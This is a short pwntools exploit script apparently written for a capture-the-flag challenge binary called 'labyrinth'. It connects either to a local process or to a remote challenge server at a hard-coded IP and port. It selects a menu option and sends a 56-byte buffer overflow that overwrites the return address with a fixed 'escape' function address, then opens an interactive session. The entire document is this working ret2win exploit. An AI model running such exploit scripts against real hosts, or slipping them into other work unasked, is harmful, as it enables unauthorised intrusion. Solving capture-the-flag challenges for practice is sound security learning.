from pwn import *

context.binary = elf = ELF("./labyrinth", checksec=False)


if args.LOCAL:
    p = process(elf.path)
else:
    p = remote('94.237.122.241', 52656)

# gdb.attach(p, gdbscript='')

buffer = b"A" * 56
escape = 0x0000000000401256

pay = buffer
pay += p64(escape)

p.sendlineafter(b">> ", b"69")
p.sendlineafter(b">> ", pay)

p.interactive()